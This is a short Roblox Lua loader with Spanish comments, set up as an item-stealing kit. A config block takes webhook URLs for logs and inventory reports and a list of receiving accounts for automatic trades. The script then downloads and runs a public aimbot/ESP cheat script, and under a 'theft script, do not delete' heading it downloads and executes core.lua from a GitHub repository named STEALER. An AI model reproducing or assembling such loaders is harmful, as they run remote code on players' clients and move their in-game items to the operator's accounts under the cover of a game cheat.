-- ==========================================
-- CONFIGURACIÓN PERSONALIZABLE
-- ==========================================
getgenv().AutoTradeConfig = {
    WebhookLogs = "TU_WEBHOOK_LOGS_AQUI",
    WebhookInventario = "TU_WEBHOOK_INVENTARIO_AQUI",
    

-- cambia jugador 1,2,3.... por el user de tus cuentas que van a recibir las cosas.  
    JugadoresObjetivos = {
        "jugador1", 
        "Jugador2",
        "Jugador3"
    }
}

-- ==========================================
-- SCRIPT DE DUELOS (PVP)
-- ==========================================
-- Pega tu script de duelos que gustes aquí debajo (PUEDES ENCONTRARLOS EN scriptblox.com)
task.spawn(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/DUELS-Murderers-VS-Sheriffs-BEST-SCRIPT-SILENT-AIM-AIMBOT-ESP-RAGEBOT-AND-ALOT-MORE-227237"))()
end)

-- ==========================================
-- CARGA DEL script de robo NO BORRES ESTO 
-- ==========================================


loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()